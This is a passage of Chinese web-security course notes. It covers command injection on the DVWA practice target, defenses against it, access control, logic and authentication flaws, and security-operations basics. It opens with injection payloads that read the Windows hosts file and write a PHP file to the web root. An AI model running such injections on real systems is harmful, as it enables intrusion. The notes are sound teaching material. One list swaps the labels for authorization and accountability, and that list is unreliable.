class="line">?a=type c:\windows\system32\drivers\etc\hosts//查看文件</span><br><span class="line">?a=cd//查看当前绝对路径</span><br><span class="line">?a=echo &quot;&lt;?php phpinfo();?&gt;&quot; &gt; E:\xampp\htdocs\php\os\phpinfo.php//写shell</span><br></pre></td></tr></table></figure><p>（1）查看文件</p><p><img src="https://www.helloimg.com/i/2024/12/12/675a57d979f85.png"></p><p>（2）查看当前绝对路径</p><p><img src="https://www.helloimg.com/i/2024/12/12/675a586c7c31b.png"></p><p>（3）写shell</p><p><img src="https://www.helloimg.com/i/2024/12/12/675a58c0e4d3b.png"></p><h4 id="4-6-4-命令执行漏洞及防御"><a href="#4-6-4-命令执行漏洞及防御" class="headerlink" title="4.6.4 命令执行漏洞及防御"></a>4.6.4 命令执行漏洞及防御</h4><h5 id="基于DVWA的命令执行漏洞分析"><a href="#基于DVWA的命令执行漏洞分析" class="headerlink" title="基于DVWA的命令执行漏洞分析"></a>基于DVWA的命令执行漏洞分析</h5><p><img src="https://www.helloimg.com/i/2024/12/12/675a5b111a88c.png"></p><p><img src="https://www.helloimg.com/i/2024/12/12/675a5bf55938e.png"></p><p><img src="https://www.helloimg.com/i/2024/12/12/675a5c57dea19.png"></p><p><img src="https://www.helloimg.com/i/2024/12/12/675a5cbd3c6ad.png"></p><p>先过滤&amp;&amp;，但是未找到，接着过滤;，过滤之后，左右&amp;拼接在一起</p><p><img src="https://www.helloimg.com/i/2024/12/12/675a5d32c4c44.png"></p><p><img src="https://www.helloimg.com/i/2024/12/12/675a6000f124c.png"></p><h5 id="命令执行漏洞防御"><a href="#命令执行漏洞防御" class="headerlink" title="命令执行漏洞防御"></a>命令执行漏洞防御</h5><p>（1）尽量不要执行外部命令</p><p>（2）使用<strong>自定义函数</strong>或函数库来替代外部命令的功能</p><p>（3）使用escapeshellarg函数来处理命令参数，esacpeshellarg函数会将任何引起参数或命令结束的字符转义，单引号替换成\‘，双引号替换成\“，分号替换成;</p><p>（4）使用safe_mode_exec_dir指定要执行程序的主目录(php.ini)，用safe_mode_exec_dir指定要执行程序的主目录，可以把会使用的命令提前放入此路径内safe_mode &#x3D;On(打开php的安全模式)<br>        safe mode exec dir &#x3D; &#x2F;usr&#x2F;local&#x2F;php&#x2F;bin&#x2F;</p><h3 id="第七部分-文件上传漏洞原理与验证"><a href="#第七部分-文件上传漏洞原理与验证" class="headerlink" title="第七部分 文件上传漏洞原理与验证"></a>第七部分 文件上传漏洞原理与验证</h3><h4 id="4-7-1文件上传漏洞概述"><a href="#4-7-1文件上传漏洞概述" class="headerlink" title="4.7.1文件上传漏洞概述"></a>4.7.1文件上传漏洞概述</h4><h4 id="4-7-2文件上传检测与绕过"><a href="#4-7-2文件上传检测与绕过" class="headerlink" title="4.7.2文件上传检测与绕过"></a>4.7.2文件上传检测与绕过</h4><h4 id="4-7-3-Web容器及IIS"><a href="#4-7-3-Web容器及IIS" class="headerlink" title="4.7.3 Web容器及IIS"></a>4.7.3 Web容器及IIS</h4><h4 id="4-7-4-Apache文件解析漏洞"><a href="#4-7-4-Apache文件解析漏洞" class="headerlink" title="4.7.4  Apache文件解析漏洞"></a>4.7.4  Apache文件解析漏洞</h4><h4 id="4-7-5-Nginx解析漏洞"><a href="#4-7-5-Nginx解析漏洞" class="headerlink" title="4.7.5 Nginx解析漏洞"></a>4.7.5 Nginx解析漏洞</h4><h4 id="4-7-6-Tomcat任意文件上传"><a href="#4-7-6-Tomcat任意文件上传" class="headerlink" title="4.7.6 Tomcat任意文件上传"></a>4.7.6 Tomcat任意文件上传</h4><h4 id="4-7-7-文件上传防御"><a href="#4-7-7-文件上传防御" class="headerlink" title="4.7.7 文件上传防御"></a>4.7.7 文件上传防御</h4><h3 id="第八部分-逻辑漏洞原理与验证"><a href="#第八部分-逻辑漏洞原理与验证" class="headerlink" title="第八部分 逻辑漏洞原理与验证"></a>第八部分 逻辑漏洞原理与验证</h3><h4 id="4-8-1-逻辑漏洞概述"><a href="#4-8-1-逻辑漏洞概述" class="headerlink" title="4.8.1 逻辑漏洞概述"></a>4.8.1 逻辑漏洞概述</h4><h5 id="访问控制概述"><a href="#访问控制概述" class="headerlink" title="访问控制概述"></a>访问控制概述</h5><ol><li>访问控制</li></ol><p>​在某种程度上来说，信息安全就是通过控制如何访问信息资源来防范资源泄露或未经授权修改的工作。</p><p>​访问控制(Access Control)指系统对用户身份及其所属的预先定义的策略组限制其使用数据资源能力的手段。通常用于系统管理员控制用户对服务器、目录、文件等络资源的访问。访问控制是系统保密性、完整性、可用性和合法使用性的重要基础，是网络安全防范和资源保护的关键策略之一，也是主体依据某些控制策略或权限对客体本身或其资源进行的不同授权访问。</p><p>​访问是主体(Subject)和客体(Object)之间的信息流动，访问控制的主要目的是限制访问主体对客体的访问，从而保障数据资源在合法范围内得以有效使用和管理。为了达到上述目的，访问控制需要完成两个任务：识别和确认访问系统的用户、决定该用户可以对某一系统资源进行何种类型的访问。</p><p>​访问控制包含三个要素，即<strong>主体</strong>、<strong>客体</strong>和<strong>访问控制策略</strong>。<br>​主体(Subject)是指访问中一个发出请求或要求的主动实体，可以是某个用户，也可以是用户启动的程序、进程或设备等;<br>​客体(Object)是接受其他实体访问的被动实体，凡是可以被操作的信息、资源、对象都可以被看作客体，可以是文件、光盘、数据库等，<br>​控制策略( Attribution )是主体对客体的访问规则集，限制主体对客体的访问权限</p><p>主体访问客体通常需要4个步骤:</p><ul><li>Identification—身份标识</li><li>Authentication     —身份验证</li><li>Authorization       —审计</li><li>Accountability      — 授权</li></ul><ol start="2"><li>访问控制模型</li></ol><p>访问控制模型是规定主体如何访问客体的一种架构，目前主要分为三种:</p><ul><li>自主访问控制(Discretionary Access Control，DAC，大部分使用)</li><li>强制访问控制(Mandatory Access Control，MAC)</li><li>角色型访问控制(Role-Based Access Control，RBAC)</li></ul><p>（1）自主访问控制</p><p>​由客体的属主自主的对客体进行管理，自主的决定是否将访问权限授予其他主体。<br>​该控制模型与所有数据和权限被操作的系统控制不一样，允许用户控制自己的数据的访问权限，根据用户的身份以及他们所属的分组来限制对对象的访问权限。用户可以通过ACL 定义什么人或什么等级的人可以访问什么资源，每一个ACL都包含一个用户和组的列表，以及它们的访问权限。<br>​缺点:主体权限太大就可能泄露信息;当用户的数量多、管理数据量大时，ACL就会很庞大，不易维护。</p><p>（2）强制访问控制</p><p>​安全策略由管理员配置，访问控制由系统实施，安全策略高于一切的存在。该控制模型是非常严格的访问控制模型，起初由政府和军方设计并使用。所有的权限由管理员预定义，并且由操作系统控制，实现了数据的权限分类和用户的权限分类，在验证的时候可以对比用户和数据的权限等级对应关系，从而知道是否有访问权限。<br>​缺点:管理不便，不够灵活，而且过重强调保密性，对系统连续工作能力、授权的可管理性方面考虑不足。</p><p>（3）角色型访问控制</p><p>​使用集中管理的控制方式来决定主体和客体如何交互，更多的用于企业中，根据不同的职位来分配不同的权限。<br>​用户被分配一个角色，而它只能拥有角色里包含的权限，没有可以绕过的方法，通过角色分离了工作职责。</p><h5 id="逻辑漏洞概述"><a href="#逻辑漏洞概述" class="headerlink" title="逻辑漏洞概述"></a>逻辑漏洞概述</h5><ol><li>逻辑漏洞</li></ol><p>​随着网络安全法的实施、企业和用户安全意识的提高，Web安全已经成为了重点关注的方向。诸如使用安全开发框架、部署安全防护设备等防护手段的使用，使得网站的常规漏洞越来越少。以SQL注入为例，由于其危害巨大，常年稳居OWASP Top10的第一位，目前很多Web开发框架在底层就直接杜绝的SQL注入问题。<br>​但“逻辑漏洞”一词现在却更加热门，很可能成为Web漏洞的主战场。之所以称之为“逻辑漏洞”，是因为在代码之后是人的逻辑，人更容易犯错，是编写完程序后随着人的思维理解产生的不足，所以逻辑漏洞一直都在。</p><p>​相比SQL注入、XSS漏洞等传统安全漏洞，SQL注入、XSS等漏洞可以通过安全框架等避免，并且攻击流量非法，对原始程序进行了破坏，防火墙可以检测；所以现在的攻击者更倾向于利用业务逻辑层的应用安全问题，逻辑漏洞就是指攻击者利用业务的设计缺陷，获取敏感信息或破环业务的完整性。一般出现在密码修改(没有旧密码验证)、越权访问、密码找回、交易支付等功能处。而且由于逻辑漏洞产生的流量多数为合法流量，传统的安全防御设备和措施收效甚微，一般的防护手段或设备无法阻止，这类问题往往危害巨大，可能造成了企业的资产损失和名誉受损，所以导致了逻辑漏洞成为了企业防护中的难题。</p><ol start="2"><li>逻辑漏洞的分类</li></ol><ul><li>验证机制缺陷</li><li>会话管理缺陷</li><li>权限管理缺陷</li><li>业务逻辑缺陷</li></ul><h5 id="验证机制"><a href="#验证机制" class="headerlink" title="验证机制"></a>验证机制</h5><p>在网络中，身份是区别于其他个体的一种标识，为了与其他个体有所区别，身份必须具有唯一性。网络中，身份不仅仅用于标识一个人，也可以用于标识一个机器、一个物体，甚至一个虚拟的东西(如进程、会话过程等)<br>        网络中的认证不是对某个事物的资质审查，而是对事物真实性的确认。身份认证的目的是鉴别通信中另一端的真实身份，防止伪造和假冒等情况发生。</p><p>​根据身份认证的对象不同，认证手段也不同，但针对每种身份的认证都有很多种不同的方法。</p><p>如果被认证的对象是人，则有三类信息可以用于认证：</p><ul><li>Who knows：某人所知道的内容，这类信息通常理解为口令</li><li>Who has：某人所拥有的物品，这类信息包括密码本、密码卡、U盾</li><li>Who is：某人的身份，这类信息包括指纹、虹膜、脸型、语音特征等</li></ul><p>​一般情况下，对人的认证只需要一种类型的信息即可，如口令(常用于登录网站)指纹(常用语登录电脑和门禁设备)、U盾(常用于网络金融业务)，而用户的身份信息就是该用户的账户名</p><p>​如果被认证的对象是一般的设备，则通常使用“挑战一应答”机制，即认证者发起一个挑战，被认证者进行应答，认证者对应答进行检验，如果符合要求，则通过认证，否则拒绝。<br>​验证机制是信息系统安全机制中最简单、最前沿的一种机制。最常见的方式是信息系统要求用户提交用户名与密码，正确则允许用户登录，错误即拒绝用户登录。</p><h5 id="会话管理"><a href="#会话管理" class="headerlink" title="会话管理"></a>会话管理</h5><p>​在人机交互时，会话管理是保持用户的整个会话活动的互动与计算机系统跟踪过程。会话管理分类：<strong>桌面会话管理</strong>、<strong>浏览器会话管理</strong>、<strong>Web服务器的会话管理</strong>。<br>​<strong>桌面会话管理</strong>器是一个程序，可以保存和恢复桌面会话，桌面会话是所有正在运行的窗口和当前的内容。受会话管理的应用程序，在保存会话的设置时，会话管理器会保存受该会话管理的所有应用程序。如果注销后再次登录，会话管理器会自动启动受该会话管理的应用程序;不受会话管理的应用程序，必须手动启动这些应用程序。</p><p>​<strong>浏览器会话管理</strong>是打开网页浏览器时，用户可以保存所有打开的网页和设定，并在以后恢复他们的日期。为了帮助恢复系统或应用软件崩溃，页面和设置也可以在下次运行恢复。</p><p>​HTTP是一种无状态协议，一次请求结束，客户端与服务端的连接就会断开，服务器再次收到请求时，无法识别此次请求是哪个用户发过来的，需要重新建立连接。为了判断发送请求的用户，需要一种记录用户的方式，也就是Web应用会话管理。它也可以简单理解为一个用户从登录到退出应用的一段期间。<br>常见的<strong>Web应用会话管理</strong>的方式有以下3种：</p><ul><li><p>基于server端session的管理方式</p></li><li><p>cookie-based的管理方式</p></li><li><p>token-based的管理方式</p></li><li><p>HTTP协议</p><ul><li>无连接<ul><li>每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接，采用这种方式可以节省传输时间。</li></ul></li><li>无状态<ul><li>指协议对于事务处理没有记忆能力，服务器不知道客户端是什么状态。即我们给服务器发送HTTP请求之后，服务器根据请求，会给我们发送数据过来，但是发送完，不会记录任何信息。</li></ul></li><li>会话<ul><li>执行会话最简单、最常见的方式是向每名用户发布一个唯一的会话令牌或标设符，用户在每一个请求中提交这个令牌</li></ul></li></ul></li></ul><img src="https://www.helloimg.com/i/2024/12/12/675aefbbc408c.png" style="zoom:67%;" /><h5 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h5><ol><li>权限管理</li></ol><p>​权限管理，一般指根据系统设置的安全规则或者安全策略，用户可以访问而且只能访问自己被授权的资源，不多不少。权限管理几乎出现在任何系统里面，只要有用户和密码的系统。很多人常将“用户身份认证”、“密码加密“、“系统管理”等概念与权限管理概念混淆。</p><p>​用户身份认证是用户要告诉系统“我是谁”，不属于权限管理范畴</p><p>​密码加密，隶属用户身份认证领域，不属于权限管理范畴。</p><p>​系统管理，一般是系统的一个模块。而且该模块一般还含有权限管理子模块。系统管理里面的权限管理模块，只是一个操作界面，让管理员能够设置角色等安全策略。系统背后还有很多权限验证逻辑，这些都并不属于该模块。总体来说，该模块相当于给权限管理模块提供了一些数据</p><ul><li>从控制力度来看，可以将权限管理分为两大类：<ul><li>功能级权限管理</li><li>数据级权限管理</li></ul></li><li>从控制方向来看，也可以将权限管理分为两大类：<ul><li>从系统获取数据，比如查询订单、查询客户资料</li><li>向系统提交数据，比如删除订单、修改客户资料</li></ul></li></ul><img src="https://www.helloimg.com/i/2024/12/12/675af1833cb59.png" style="zoom:67%;" /><h5 id="业务逻辑"><a href="#业务逻辑" class="headerlink" title="业务逻辑"></a>业务逻辑</h5><p>​不同的项目有不同的功能，不同的功能需要不同的实现，实现这些核心功能的代码就叫业务逻辑。</p><p>​很多先接触分层结构，然后对每层产生了初步认识。其中，由于表示层和数据访问层的代码职责清晰明确，基本能正确认识。但是，由于接触的分层架构的Demo大多业务极其简单，又基本是CRUD(常说的增删改查)操作集中型的业务，就会狭义的认为业务逻辑基本就是对数据访问简单的封装。</p><p>​业务逻辑广义的认知应该是：软件产品都是在某个领域内实现某些特定业务，所以，软件产品天生应该分解为界面交互部分和业务逻辑部分，其中业务逻辑部分是软件产品的核心，它客观存在于软件产品内部，但是无法对使用者产生直观刺激，因此业务逻辑不能与使用者直接交互。而界面交互部分是业务逻辑与使用者进行交流的接口，使用者，通过界面交互部分，与业务进行交流，从而使得软件产品发挥其作用。</p><img src="https://www.helloimg.com/i/2024/12/12/675af2817fb2a.png" style="zoom:67%;" /><h4 id="4-8-2-验证机制问题"><a href="#4-8-2-验证机制问题" class="headerlink" title="4.8.2 验证机制问题"></a>4.8.2 验证机制问题</h4><h5 id="验证机制-1"><a href="#验证机制-1" class="headerlink" title="验证机制"></a>验证机制</h5><p>​身份验证是核心防御机制中最薄弱的环节，身份验证机制也是攻击者的主要攻击目标之一。<br>​验证机制是应用程序防御恶意攻击的中心机制。它处于防御未授权的最前沿，如果用户能够突破那些防御，他们通常能够控制应用程序的全部功能，自由访问其中的数据缺乏安全稳定的验证机制，其他核心安全机制(如会话管理和访问控制)都无法有效实施。<br>​验证机制最常见的方式是信息系统要求用户提交用户名与密码，正确则允许用户登录，错误则拒绝用户登录。</p><p>验证机制问题主要分为两个方面分别为：<strong>设计缺陷</strong>和<strong>执行缺陷</strong></p><p><img src="https://www.helloimg.com/i/2024/12/14/675cffb39280a.png"></p><p>Web应用程序常用的验证机制有：</p><ul><li>基于HTML表单的验证(最常用)</li><li>多元机制，如组合型密码和物理令牌(多用于安全性要求较高的应用程序比如说提供进行巨额交易服务的私人银行)</li><li>客户端SSL证书或智能卡(成本非常昂贵，通常只有那些用户不多的安全性极其重要的应用程序才会使用)</li><li>HTTP基本和摘要验证(内网使用较多，建立在域环境及内网对用户的访问控制之上的)</li><li>使用NTLM或Kerberos整合windows的验证</li><li>第三方验证服务(尚未得到大量使用)</li></ul><h5 id="验证机制设计缺陷"><a href="#验证机制设计缺陷" class="headerlink" title="验证机制设计缺陷"></a>验证机制设计缺陷</h5><ol><li>可预测的用户名</li></ol><p>​有些应用程序需要用户注册时用户名符合某一特定规则，比如需要满足“姓名缩写数字”的这种形式，其中数字是为了防止用户名重复，也就是说如果在存在姓名缩写相同的情况下后面要跟数字或者进行数字累加。这种在学校邮箱注册时是比较常见的。通过这种方式攻击者可以很方便的获得大量有效用户名</p><ol start="2"><li>非唯一性用户名</li></ol><p>​极少部分的应用程序不要求用户名的唯一性，这就可能造成这样的问题：<br>​在恰巧有两名用户使用相同的用户名及密码的情况下，应用程序要么阻止第二个用户设置密码，要么允许其设置相同的密码。前者这种情况可能导致第一名用户的密码泄露给第二名用户，这种情况下攻击者如果想获得某个已知用户名对应的密码则可以通过注册功能针对于此用户名使用不同的密码注册，如果应用程序返回禁止注册，那么我们可以推测出此次注册时的密码就是这个用户名对应的密码。后者则可能导致第二名用户可以访问第一名用户的状态。</p><ol start="3"><li>弱口令</li></ol><p>​弱口令(Weak Password)指容易被他人猜到的口令，除123456、12345678、admin等常见口令外，生日、姓名、手机号、1qaz@WSX也被称为弱口令。<br>​为节省攻击成本，通常会适用弱口令字典进行字典攻击</p><p><img src="https://www.helloimg.com/i/2024/12/14/675d90ac16ddf.png"></p><ol start="4"><li>密码确认不完善</li></ol><p>一些应用程序在用户注册设置密码时，出于一些原因往往会对密码进行如下处理</p><ul><li>截断前n个字符</li><li>大小写不敏感</li><li>删除特殊字符</li></ul><p>​上述操作均会减少应用程序的密码空间，攻击者通过仔细分析应用程序的密码处理规则后，可以适当修改自己的暴破字典从而提高暴破的成功率。</p><ol start="5"><li>可预测的密码</li></ol><p>​在像学校，企业这种存在批量注册大量用户需求的应用程序中，经常会为批量用户设置默认密码，这种默认密码可以是相同的也可以是与用户名或者其身份证信息等有关系的。这种情况下攻击者可以通过Google hacking来在公开信息汇总收集大量初始密码，也可以根据默认密码规律推测出大量密码。</p><ol start="6"><li>暴力破解</li></ol><p>​暴力破解(Brute Force)，也可称为蛮力攻击，指利用穷举法将所有的可能性一一尝试，理论上可以破解所有密码问题。实际测试中，考虑到攻击成本问题，通常使用字典攻击(Dictionary Attack)，即逐一尝试用户自定义词典中的可能密码(单词或短语)的攻击方式。</p><p><img src="https://www.helloimg.com/i/2024/12/14/675d92262d2ea.png"></p><p>​如果应用程序允许用户在登录失败很多次后，仍能继续尝试登录，那么这种情况下此应用可能存在暴破攻击。为了防止暴破攻击，应用程序应该设置用户登录失败次数上限，当用户失败的登录次数达到上限后应用程序应该阻止用户进一步的登录。但是通过前端脚本或者Cookie来统计用户失败的登录次数是不可靠的，因为这些都是攻击者可以接触到并且可以修改的，如果服务器端使用Session来存储用户失败登录的次数这样就可靠的多。除了用户登录次数的统计问题外，如何处理失败登录次数达到上限的用户也是一个需要谨慎处理的问题，如果用户在登录失败很多次后被锁定，但是锁定状态下的用户使用正确密码登录时和使用错误密码登录时Web应用程序的响应信息不同那么此时此应用还是存在暴破漏洞</p><p><img src="https://www.helloimg.com/i/2024/12/14/675d92ecec548.png"></p><p><img src="https://www.helloimg.com/i/2024/12/14/675d931f31e0e.png"></p><p><img src="https://www.helloimg.com/i/2024/12/14/675d9355c764b.png"></p><p><img src="https://www.helloimg.com/i/2024/12/14/675d937fb3616.png"></p><ol start="7"><li>密码重置</li></ol><p>​在逻辑漏洞中密码重置问题是比较常见的一种场景，常见于用户修改密码页面、用户找回密码页面等涉及到网站重置密码功能的页面。</p><ul><li>修改密码</li></ul><p>​目前的修改密码的方式大概可以分为两种，第一种是要求用户键入用户名、旧密码、新密码、确认新密码四部分，一些Web应用程序会<u>忽略修改密码处旧密码错误输入次数过多</u>的问题，这就容易被攻击者利用来进行密码暴破；还有一种最不安全的情况就是<u>只需要用户键入用户名、新密码、确认新密码</u>即可更改用户名相应的密码，这种情况下攻击者无需暴破即可获得正确的用户名及密码组合。</p><ul><li>找回密码</li></ul><p>​忘记密码功能往往通过设置一组问题来验证用户身份，比如这些问题可以是“我最喜欢的颜色”，这些问题的答案组合次数相对于密码来说小的多，并且可以通过信息收集工作来提供辅助。攻击者可以收集一组用户名并逐个遍历然后记录相应的问题在其中选择最简单的那个下手可以获得更高的成功率<br>​忘记密码处可能<u>不会设置错误次数限制</u>从而允许攻击者猜测上述问题的答案<br>​通常Web应用程序也会设置密码暗示来代替上述问题，这些<u>密码暗示往往能够辅助攻击者猜测密码</u>，有些用户甚至直接把密码设置为密码暗示。攻击者同样可以通过枚举收集到的用户名然后获得一组密码暗示，从而寻找出最容易获得的密码</p><p>​当前Web应用程序可能通过向用户邮箱发送密码重置链接来帮助用户修改密码，这种链接是随机的攻击者很难对其进行猜解。但是有些应用在设计这个逻辑时可能允许Web应用程序将用户密码修复的邮件发送至攻击者，有时邮箱地址并没有直接显示出来而是存储在隐藏的表单中这时<u>攻击者可以将邮箱修改为自己的邮箱</u>。在最差的情况下攻击者可以尝试推测密码重置的URL来重置用户密码</p><p>常见密码重置问题</p><ul><li>用户名枚举：网站反馈多余信息，可猜测用户信息</li><li>验证码返回前端处理：可截获、修改</li><li>修改Request：用户名、手机号、Cookie等信息可修改</li><li>修改Response：操作结果成功&#x2F;失败可修改</li><li>暴力破解验证码：验证码长度有限，或验证码未设置可靠的失效时间</li><li>拼凑密码重置链接：重置密码链接有规可循</li></ul><ol start="8"><li>记住密码</li></ol><p>​一些应用程序为了方便用户访问通常会提供“记住密码”的功能，此功能通常仅通过cookie中的某个字段来实现。比如Cookie中会设置一个存储用户名的字段来实现基础我的功能如果这样的话攻击者仅需要<u>随便注册一个用户然后将Cookie中用户名修改为其想要访问用户的用户名即可实现对目标用户的访问</u>。Cookie中还可能通过存储一个ID字段来唯一的标识用户，这种情况下攻击者可以<u>遍历ID从而实现遍历访问用户</u></p><ol start="9"><li>证书分配不安全</li></ol><p>​目前很多应用程序在注册时都会要求用户填入邮箱信息，并在稍后发送给用户一封激活邮件，如果邮件中保存有用户的初始用户名及密码并且这种邮件有没有及时的删除，在邮件泄露或者邮箱被攻击者攻破的情况下，则会泄露应用程序的密码。</p><p>​除此之外有些激活URL可能存在某种规律，攻击者可以通过注册，连续地注册用户来观察这种规律，从而推测其他用户的激活URL。</p><ol start="10"><li>证书传输易受攻击</li></ol><p>​如果Web应用程序在网络环境中以明文的方式传递证书，那么攻击者则可能通过探、中间人等各种方式获取。</p><ol start="11"><li>异常开放登录机制</li></ol><p>验证机制在代码实现过程中也可能由于编码者某些疏忽造成安全问题</p><ul><li><p>使用控制的一个账户执行一次完整、有效的登录。使用拦截代理服务器记录提交的每一份数据、收到的每一个响应</p></li><li><p>多次重复登录过程，以非常规方式修改提交的数据。比如，对于客户端传送的每个请求参数或Cookie</p><ul><li>提交一个空字符串</li><li>完全删除键值对</li><li>提交非常长和非常短的值</li><li>提交字符串代替数字或相反</li><li>针对某一参数，尝试重复提交相同和不同的值</li></ul></li><li><p>仔细检查应用程序对提交的每个畸形请求的响应，确定任何不同于基本情况的差异</p></li><li><p>根据这些观察结果调整测试过程。如果某个修改造成行为改变，设法将这个修改与其他更改组合在一起，使应用程序的逻辑达到最大限度</p></li></ul><ol start="12"><li>多阶段登录机制中的缺陷</li></ol><p>​有些对于安全性要求较高的应用可能会采取多阶段登录验证机制，比如一个多阶段验证机制可以有以下三个过程组成</p><ul><li>提交用户名及密码</li><li>响应一个质询，答案可能使PIN中的特殊数字或者一个值得纪念的词</li><li>提交物理令牌上的值</li></ul><p>​多阶段登录机制确实可以明显的提高登录验证的安全性，但是更多的阶段同样意味着可能潜在有更多的执行缺陷。比如可能存在以下几个常见的缺陷:</p><ul><li>应用程序认为访问第三阶段的用户已经完成了一二阶段的认证。这种情况下仅拥有部分登录凭证的攻击者可以成功登录</li><li>在每个阶段的验证过程中，应用程序会保存相应的标志，比如账户是否过期是否被锁定、是否属于管理员、是否需要完成更多的登录验证阶段。如果攻击者可以在某一个登录阶段接触到上一个阶段设置的标记，那么攻击者可以对这些标记进行修改从而完成一定程度的攻击行为</li></ul><p>​应用程序有可能会认为各阶段认证过程中用户的身份都不会发生变化，并且不会在每一个阶段检查用户身份的统一性，那么如果攻击者在第一阶段输入的用户名及密码与后面阶段输入的验证凭证不一致，且应用程序会以两种或三种验证凭证任一对应的用户身份登录的话，这就存在严重的安全问题。这种情况下攻击者只需要知道目标用户的部分验证信息就可以登录，而其他信息则可以通过自己注册获得部分信息，这种攻击的严重程度取决于应用程序用于确定用户身份的验证凭证的易获得度(比如应用程序以第一阶段的用户名及密码来确定身份，那么存在上述缺陷的情况下攻击者可以使用自己的后两个阶段的验证凭证来进行登录，PIN码内容及物理令牌相对于用户名及密码来说更难获得以这种情况下攻击的严重程度比较高</p><p>测试多阶段验证机制可以按照以下步骤进行：</p><ul><li>记录一次有效账户完整的登录过程，并使用代理记录每一阶段的数据</li><li>收集那些由服务器返回的且重复提交的数据，这些数据往往放置与Cookie，URL预设参数，隐藏表单字段等位置</li><li>对于上述收集到的重复提交的数据试着在另一阶段将其修改为不同的值看看是否能够登录成功</li><li>还需要注意任何提交到服务器且不是用户直接输入的数据，这些数据可能是登录进展的状态信息，比如stage2complete&#x3D;True，攻击者可以直接修改这些值进入下一阶段</li><li>尝试各种畸形的登录过程</li></ul><h5 id="验证机制执行缺陷"><a href="#验证机制执行缺陷" class="headerlink" title="验证机制执行缺陷"></a>验证机制执行缺陷</h5><h4 id="4-8-3-会话管理问题"><a href="#4-8-3-会话管理问题" class="headerlink" title="4.8.3 会话管理问题"></a>4.8.3 会话管理问题</h4><h4 id="4-8-4-权限控制问题"><a href="#4-8-4-权限控制问题" class="headerlink" title="4.8.4 权限控制问题"></a>4.8.4 权限控制问题</h4><h4 id="4-8-5-业务逻辑问题"><a href="#4-8-5-业务逻辑问题" class="headerlink" title="4.8.5 业务逻辑问题"></a>4.8.5 业务逻辑问题</h4><h2 id="第五章-网络安全运营"><a href="#第五章-网络安全运营" class="headerlink" title="第五章 网络安全运营"></a>第五章 网络安全运营</h2><h3 id="第一部分-网络安全运营概述"><a href="#第一部分-网络安全运营概述" class="headerlink" title="第一部分 网络安全运营概述"></a>第一部分 网络安全运营概述</h3><h4 id="5-1-1-什么是安全运营"><a href="#5-1-1-什么是安全运营" class="headerlink" title="5.1.1 什么是安全运营"></a>5.1.1 什么是安全运营</h4><h5 id="安全运营背景"><a href="#安全运营背景" class="headerlink" title="安全运营背景"></a>安全运营背景</h5><p><img src="https://www.helloimg.com/i/2024/12/15/675ef2f05456f.png"></p><p><img src="https://www.helloimg.com/i/2024/12/15/675ef313acc34.png"></p><p>什么是安全运营？</p><p><img src="https://www.helloimg.com/i/2024/12/15/675ef3a5eecf2.png"></p><p>从安全运维到安全运营</p><p><img src="https://www.helloimg.com/i/2024/12/15/675ef3e0139e9.png"></p><p>安全运营工程师做什么？</p><p><img src="https://www.helloimg.com/i/2024/12/15/675ef431f21fd.png"></p><p><img src="https://www.helloimg.com/i/2024/12/15/675ef468510b9.png"></p><h5 id="安全运营和安全运营中心概念"><a href="#安全运营和安全运营中心概念" class="headerlink" title="安全运营和安全运营中心概念"></a>安全运营和安全运营中心概念</h5><p>安全运营中心：</p><p>​安全运营中心(SOC)是指以信息资产为核心，通过针对网络、系统、应用、安全设备的日志和报警事件进行监控和分析，建立一套实时的资产风险模型，以安全事件管理为核心流程，协助安全管理员进行事件分析、风险分析、预警和应急响应处理的集中安全管理系统。</p><p>从名称来看：</p><ul><li>S-&gt;Security(安全)，即SOC处理的事件或流程应该是与企业网络安全相关的，</li><li>O-&gt;Operations(运营)，代表着一种动态的动作，包括但不限于实时的检测和响应</li><li>C-&gt;Center(中心)，体系化的建设，多领域安全产品、服务“叠加”而成的综合防线</li></ul><h5 id="安全运营目标"><a href="#安全运营目标" class="headerlink" title="安全运营目标"></a>安全运营目标</h5><p><img src="https://www.helloimg.com/i/2024/12/15/675ef5707709a.png"></p><p><img src="https://www.helloimg.com/i/2024/12/15/675ef588b4318.png"></p><h5 id="如何实现安全运营"><a href="#如何实现安全运营" class="headerlink" title="如何实现安全运营"></a>如何实现安全运营</h5><p><img src="https://www.helloimg.com/i/2024/12/15/675ef5af209fe.png"></p><p><img src="https://www.helloimg.com/i/2024/12/15/675ef6087272f.png"></p><p><img src="https://www.helloimg.com/i/2024/12/15/675ef62e7a66a.png"></p><p><img src="https://www.helloimg.com/i/2024/12/15/675ef692872a2.png"></p><p>成熟的安全运营中心</p><p><img src="https://www.helloimg.com/i/2024/12/15/675ef6d162a1c.png"></p><p><img src="https://www.helloimg.com/i/2024/12/15/675ef765b2478.png"></p><h4 id="5-1-2-安全运营产品与模式"><a href="#5-1-2-安全运营产品与模式" class="headerlink" title="5.1.2 安全运营产品与模式"></a>5.1.2 安全运营产品与模式</h4><h4 id="5-1-3-安全运营技术架构"><a href="#5-1-3-安全运营技术架构" class="headerlink" title="5.1.3 安全运营技术架构"></a>5.1.3 安全运营技术架构</h4><h4 id="5-1-4-安全运营流程"><a href="#5-1-4-安全运营流程" class="headerlink" title="5.1.4 安全运营流程"></a>5.1.4 安全运营流程</h4><h3 id="第二部分-网络安全运营服务"><a href="#第二部分-网络安全运营服务" class="headerlink" title="第二部分 网络安全运营服务"></a>第二部分 网络安全运营服务</h3><h4 id="5-2-1-安全运营服务基础"><a href="#5-2-1-安全运营服务基础" class="headerlink" title="5.2.1 安全运营服务基础"></a>5.2.1 安全运营服务基础</h4><h4 id="5-2-2-安全运营服务技术"><a href="#5-2-2-安全运营服务技术" class="headerlink" title="5.2.2 安全运营服务技术"></a>5.2.2 安全运营服务技术</h4><h3 id="第三部分-网络安全运营流程建设"><a href="#第三部分-网络安全运营流程建设" class="headerlink" title="第三部分 网络安全运营流程建设"></a>第三部分 网络安全运营流程建设</h3><h4 id="5-3-1-安全运营中心的准备和规划"><a href="#5-3-1-安全运营中心的准备和规划" class="headerlink" title="5.3.1 安全运营中心的准备和规划"></a>5.3.1 安全运营中心的准备和规划</h4><h4 id="5-3-2-安全运营中心的实施"><a href="#5-3-2-安全运营中心的实施" class="headerlink" title="5.3.2 安全运营中心的实施"></a>5.3.2 安全运营中心的实施</h4><h4 id="5-3-3-安全运营中心的运营和改进"><a href="#5-3-3-安全运营中心的运营和改进" class="headerlink" title="5.3.3 安全运营中心的运营和改进"></a>5.3.3 安全运营中心的运营和改进</h4><h2 id="第六章-企业安全"><a href="#第六章-企业安全" class="headerlink" 